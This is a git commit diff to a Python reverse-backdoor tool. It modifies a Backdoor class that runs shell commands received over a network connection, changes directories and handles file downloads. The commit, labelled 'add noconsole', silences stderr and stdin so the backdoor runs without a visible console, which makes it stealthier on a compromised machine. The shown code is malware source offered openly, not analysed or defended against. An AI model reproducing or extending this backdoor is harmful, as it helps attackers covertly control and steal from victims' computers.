788c33fbf7eb29714da34e40f16529bf372ffada
daichitominaga <daichi.tominaga.1112@gmail.com>
2020-07-06 00:49:13 +0900

    add noconsole

--- reverse_backdoor/reverse_backdoor.py
+++ reverse_backdoor/reverse_backdoor.py
@@ -4,6 +4,7 @@ import subprocess
 import json
 import os
 import base64
+import sys
 
 
 class Backdoor:
@@ -26,7 +27,8 @@ class Backdoor:
 
 
     def execute_system_command(self, command):
-        return subprocess.check_output(command, shell=True)
+        DEVNULL = open(os.devnull, 'wb')
+        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)
 
     def change_working_directory_to(self, path):
         os.chdir(path)
@@ -47,7 +49,7 @@ class Backdoor:
             try:
                 if command[0] == "exit":
                     self.connection.close()
-                    exit()
+                    sys.exit()
                 elif command[0] == "cd" and len(command) > 1:
                     command_result = self.change_working_directory_to(command[1])
                 elif command[0] == "download":
